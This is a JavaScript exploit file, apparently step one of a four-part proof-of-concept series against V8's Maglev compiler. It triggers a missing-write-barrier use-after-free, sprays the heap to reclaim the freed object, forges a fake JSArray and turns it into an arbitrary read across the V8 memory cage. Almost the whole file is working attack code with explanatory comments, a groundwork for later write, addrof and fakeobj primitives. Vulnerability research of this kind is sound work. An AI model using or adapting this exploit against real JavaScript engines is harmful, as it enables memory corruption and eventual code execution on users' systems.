// ============================================================================
//  Maglev primitives -- STEP 1 / 4 -- CAGED READ
//
//  An incremental build-up of the Stage-1 primitives. Each file in primitives/
//  adds exactly ONE capability on top of the previous one:
//
//     1_caged_read.js   <-- YOU ARE HERE   trigger -> UAF -> fake array -> READ
//     2_caged_write.js                     + caged write
//     3_addrof.js                          + addrof
//     4_fakeobj.js                         + fakeobj   (== poc3.js)
//
//  This first file is the foundation and does the heavy lifting: trigger the
//  Maglev bug, reclaim the freed HeapNumber into memory we control, forge a fake
//  JSArray over it, and widen that array into a window over the entire V8 cage --
//  giving arbitrary READ. Steps 2-4 are short deltas on top of this engine.
//
//  Full commentary + the bug's root cause live in ../poc3.js; here the
//  engine is summarized and the NEW capability (marked *) is spelled out.
//
//  Build: V8 14.6.202.33 (commit f09a912) release d8, any arch.
//  Run:   d8 --allow-natives-syntax --maglev --no-turbofan 1_caged_read.js
//  (Reclaim is GC-timing dependent; on a "[FAIL]" line just re-run.)
// ============================================================================

function log(s)       { print(s); }
function ok(s)        { print('  [ok]   ' + s); }
function step(s)      { print('\n=== ' + s + ' ==='); }
function hex(x)       { return '0x' + (x >>> 0).toString(16); }
function die(s)       { print('[FAIL] ' + s); throw new Error(s); }
function assert(c, s) { if (!c) die(s); }

// type punning: 8 bytes as one double, or as two 32-bit halves. pack(lo,hi)
// builds the double whose halves are lo and hi.
const punF = new Float64Array(1);
const punU = new Uint32Array(punF.buffer);
const punI = new Int32Array(punF.buffer);
function pack(lo, hi) { punU[0] = lo >>> 0; punU[1] = hi >>> 0; return punF[0]; }

// hnSrc[0] read back is a real HeapNumber, NOT the Smi 11: loading a Float64Array
// element always boxes the value on the heap, even when it fits in Smi range. That
// mismatch is the whole trick -- warm() feeds the literal 11 (a Smi) to compile the
// trigger, then we fire the bug with hnSrc[0] (a HeapNumber).
const hnSrc = new Float64Array(1); hnSrc[0] = 11.0;

// -- V8 value representations we rely on (pointer compression is ON) -------------
//  * Smi (small integer): a JS integer N is stored as the 32-bit value (N << 1);
//    the low bit is 0 (the Smi tag). So the length 0x3fffffff sits in memory as
//    0x7ffffffe, and a marker Smi M appears as (M << 1).
//  * Tagged pointer: a heap reference is a 32-bit offset into the 4 GB "cage" with
//    the low bit SET (1) as the HeapObject tag. Hence we untag with `- 1`, retag
//    with `| 1`, and (v & 1) == 1 means "v is a pointer". Because references are
//    only 4 bytes, a JSArray's four header fields [map, properties, elements,
//    length] total 16 bytes -- exactly two 8-byte doubles (see forgeArray).
const HN_MAP     = 0x515;         // HeapNumber map            (ReadOnlySpace)
const EMPTY_FA   = 0x7bd;         // empty_fixed_array         (ReadOnlySpace)
const DOUBLE_MAP = 0x0100cf51;    // PACKED_DOUBLE JSArray map  (see ../poc3.js)

// ---------------------------------------------------------------- ENGINE ----
// STEP 0: the trigger. We store the parameter x into three script cells in order;
// each declaration lands its cell in a particular Maglev feedback state (`let`
// makes a ContextCell, `var` a PropertyCell):
//   aT: `let aT=0; aT=0x40000000` -> kInt32  (0x40000000 = 2^30, one past the
//        31-bit Smi range, so the cell leaves Smi state for int32)
//   bT: `let bT=11`               -> kConst  (stays 11 through warm-up)
//   cT: `var cT=0; cT=1`          -> kConstantType (value changes, type stays Smi)
// In that order Maglev mislabels a HeapNumber as a Smi and emits the store to cT
// with NO write barrier. The write barrier is what records the cell->HeapNumber
// reference in the GC's remembered set; skip it and the next minor GC never sees
// the reference, frees the (young) HeapNumber, and leaves cT dangling at it.
// The decoy triplets are identical dummies that keep the young-gen allocation
// stream uniform, so the freed HeapNumber lands where we spray next.
// (Full root cause: ../poc3.js / the blog post.)
let aD1=0;aD1=0x40000000;let bD1=11;var cD1=0;cD1=1;
let aD2=0;aD2=0x40000000;let bD2=11;var cD2=0;cD2=1;
let aD3=0;aD3=0x40000000;let bD3=11;var cD3=0;cD3=1;
let aT =0;aT =0x40000000;let bT =11;var cT =0;cT =1;
function decoy1(x)  { aD1 = x; bD1 = x; cD1 = x; }
function decoy2(x)  { aD2 = x; bD2 = x; cD2 = x; }
function decoy3(x)  { aD3 = x; bD3 = x; cD3 = x; }
function trigger(x) { aT  = x; bT  = x; cT  = x;  }   // cT is the target cell
function warm(n)    { for (let i = 0; i < n; i++) { decoy1(11); decoy2(11); decoy3(11); trigger(11); } }

// read a 32-bit word at FixedDoubleArray byte offset `off` (8-byte header, then
// 8-byte elements); ((off&~7)-8)>>3 maps `off` to a JS element index.
function readWord(arr, off) {
  punF[0] = arr[((off & ~7) - 8) >>> 3];
  return (off & 4) ? punI[1] : punI[0];
}

const ELEMS = 256, NSPRAY = 600;
let spray = new Array(NSPRAY), seaArr;

(function warmUp1() {                          // let Maglev compile the trigger
  warm(3000);
  let j = 0; for (let i = 0; i < 1000000; i++) j += i;
  warm(1000);
})();

// STEP 1: spray a "sea of 0x515" (every element = HN_MAP|HN_MAP), so wherever cT
// lands after reclaim it still reads as a valid HeapNumber holding bytes we chose.
(function buildSpray() {
  seaArr = [pack(HN_MAP, HN_MAP)];
  for (let e = 1; e < ELEMS; e++) seaArr.push(seaArr[0]);
  for (let s = 0; s < NSPRAY; s++) spray[s] = seaArr.slice();
})();

(function warmUp2() {                          // also compile readWord
  warm(5000);
  for (let w = 0; w < 5000; w++) readWord(seaArr, 16);
  let j = 0; for (let i = 0; i < 2000000; i++) j += i;
  warm(2000);
  for (let w = 0; w < 2000; w++) readWord(seaArr, 16);
})();

step('STEP 1  Trigger, reclaim, forge a fake array, widen to a cage window');

trigger(hnSrc[0]);        // fire the bug: HeapNumber stored into cT, unbarriered

// churn to force the minor GC that frees cT's HeapNumber and reuses its memory.
const CHURN_PER_ROUND = 1100, CHURN_ROUNDS = 20;
let churnArrs = new Array(CHURN_PER_ROUND * CHURN_ROUNDS), churnCount = 0;
(function churn() {
  for (let r = 0; r < CHURN_ROUNDS; r++) {
    for (let s = 0; s < CHURN_PER_ROUND; s++) churnArrs[churnCount++] = seaArr.slice();
    if (typeof cT !== 'number') return;
    punF[0] = cT; if (punU[1] !== 0x40260000) return;   // cT no longer reads 11.0 -> reclaimed
  }
})();
assert(typeof cT === 'number', 'reclaim miss (cT on a non-number header)');
punF[0] = cT;
assert(punU[0] === HN_MAP && punU[1] === HN_MAP,
       'reclaim miss: cT reads ' + hex(punU[1]) + '_' + hex(punU[0]));
ok('cT dangles into the 0x515 sea (after ' + churnCount + ' churn arrays)');

// locate which sprayed element/array cT overlaps (reclaim lands it at an unknown
// offset -- see ../poc3.js). probeDbl differs from the sea in its high half.
const probeDbl = pack(HN_MAP, 0x517), seaDbl = pack(HN_MAP, HN_MAP);
// align = where cT's reclaimed object sits in the 8-byte double grid: 0 = overlaps
// a double exactly, 4 = shifted half an element (which is why forgeArray then
// straddles 3 doubles and the anchor read switches punI[0] <-> punI[1]).
let elemIdx = -1, align = -1;
(function findElement() {
  for (let k = 0; k < ELEMS; k++) {
    for (let s = 0; s < NSPRAY; s++)     spray[s][k]     = probeDbl;
    for (let s = 0; s < churnCount; s++) churnArrs[s][k] = probeDbl;
    if (typeof cT !== 'number') { elemIdx = k; align = 4; return; }
    punF[0] = cT;
    if (punU[0] === 0x517) { elemIdx = k;     align = 0; return; }
    if (punU[1] === 0x517) { elemIdx = k - 1; align = 4; return; }
    for (let s = 0; s < NSPRAY; s++)     spray[s][k]     = seaDbl;
    for (let s = 0; s < churnCount; s++) churnArrs[s][k] = seaDbl;
  }
})();
assert(elemIdx >= 0, 'could not locate cT within the spray');

let arrIdx = -1, srcPool = null;
(function findSource() {
  for (let s = 0; s < NSPRAY; s++)     spray[s][elemIdx]     = probeDbl;
  for (let s = 0; s < churnCount; s++) churnArrs[s][elemIdx] = probeDbl;
  if (align === 0) {
    for (let s = 0; s < churnCount; s++) {
      churnArrs[s][elemIdx] = seaDbl; punF[0] = cT;
      if (punI[0] !== 0x517) { arrIdx = s; srcPool = churnArrs; return; }
      churnArrs[s][elemIdx] = probeDbl;
    }
    for (let s = 0; s < NSPRAY; s++) {
      spray[s][elemIdx] = seaDbl; punF[0] = cT;
      if (punI[0] !== 0x517) { arrIdx = s; srcPool = spray; return; }
      spray[s][elemIdx] = probeDbl;
    }
  } else {
    for (let s = 0; s < churnCount; s++) {
      churnArrs[s][elemIdx] = seaDbl;
      if (typeof cT === 'number') { arrIdx = s; srcPool = churnArrs; return; }
      churnArrs[s][elemIdx] = probeDbl;
    }
    for (let s = 0; s < NSPRAY; s++) {
      spray[s][elemIdx] = seaDbl;
      if (typeof cT === 'number') { arrIdx = s; srcPool = spray; return; }
      spray[s][elemIdx] = probeDbl;
    }
  }
})();
assert(arrIdx >= 0, 'could not identify cT source array');
ok('cT overlaps ' + (srcPool === churnArrs ? 'churnArrs' : 'spray') + '[' + arrIdx + '] element [' + elemIdx + '] +' + align);

// forge a fake JSArray [map, properties, elements, length] over cT's bytes; at
// align 4 the 4 words straddle 3 doubles, so the untouched halves are padded.
function forgeArray(map, properties, elements, length) {
  const a = srcPool[arrIdx];
  if (align === 0) {
    a[elemIdx]     = pack(map, properties);
    a[elemIdx + 1] = pack(elements, length);
  } else {
    a[elemIdx]     = pack(HN_MAP, map);
    a[elemIdx + 1] = pack(properties, elements);
    a[elemIdx + 2] = pack(length, HN_MAP);
  }
}

// forge an empty array, then grow it once -> V8 allocates a backing store and
// writes its (leaked) compressed pointer into `elements`: the MEMORY ANCHOR.
forgeArray(DOUBLE_MAP, EMPTY_FA, EMPTY_FA, 0);
cT[0] = 1.1;
punF[0] = srcPool[arrIdx][elemIdx + 1];
let anchor = (align === 0 ? punI[0] : punI[1]) - 1;
assert(anchor > 0 && cT[0] === 1.1, 'anchor leak failed (' + hex(anchor) + ')');
ok('memory anchor = ' + hex(anchor) + '  (first leaked in-cage address)');

// * NEW THIS STEP * -----------------------------------------------------------
// Re-forge the fake array as a window over the whole cage: elements = cage offset
// 0 (compressed pointer 1), length = 0x3fffffff. Now cT[i] -- read through our
// float/int views -- is the 8 bytes at cage_base + 8 + i*8, for any i in the cage.
forgeArray(DOUBLE_MAP, EMPTY_FA, 1, 0x7ffffffe);   // 0x7ffffffe = Smi-encoded length 0x3fffffff
function cageRead(off) { return readWord(cT, off) >>> 0; }   // PRIMITIVE 1: caged read
ok('cage-wide reader installed (cT.length = 0x3fffffff)');

step('DEMONSTRATION  caged read');
// The backing store V8 just allocated for us (via cT[0]=1.1) lives at `anchor`
// and holds the double 1.1 as element 0. A FixedDoubleArray is [map(4), length(4),
// element0(8), ...], so element 0 sits at anchor+8. Read those 8 bytes back out of
// the cage and reconstruct the double -- ground truth we planted ourselves.
let readBack = pack(cageRead(anchor + 8), cageRead(anchor + 12));
assert(readBack === 1.1, 'caged read wrong: got ' + readBack);
ok('map word    @ anchor+0 = ' + hex(cageRead(anchor)) + '  (a FixedDoubleArray map)');
ok('element[0]  @ anchor+8 = ' + readBack + '  (the 1.1 we planted -- read via the cage)');
ok('==> arbitrary READ of any address inside the V8 cage');

// cleanup: cT is a fake array whose elements point at cage offset 0; drop it (and
// restore the defaced sea slot) so the GC d8 runs at shutdown stays happy.
(function cleanup() {
  srcPool[arrIdx][elemIdx]     = seaDbl;
  srcPool[arrIdx][elemIdx + 1] = seaDbl;
  if (align) srcPool[arrIdx][elemIdx + 2] = seaDbl;
  cT = 0;
})();

log('\n----------------------------------------------------------------');
log(' STEP 1 COMPLETE: caged READ. Next: 2_caged_write.js adds caged write.');
log('----------------------------------------------------------------');
